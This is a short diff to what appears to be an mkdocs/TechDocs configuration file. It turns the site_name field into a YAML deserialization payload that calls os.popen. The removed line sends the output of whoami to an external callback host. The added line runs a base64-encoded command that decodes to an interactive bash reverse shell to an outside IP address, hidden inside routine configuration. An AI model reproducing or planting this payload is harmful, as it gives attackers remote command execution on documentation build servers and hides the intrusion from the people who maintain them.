@@ -1,7 +1,8 @@
 site_name: !!python/object/apply:os.popen
-  - "curl http://dn4y2aasg2i1sphwn7mtytph68c00toi.oastify.com/RCE_CONFIRMADO_USUARIO_$(whoami)"
+  - "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zNC4xNzUuNDEuMTYxLzEyMzQgMD4mMQo= | base64 -d | bash"
 plugins:
   - techdocs-core
+
 
 
 
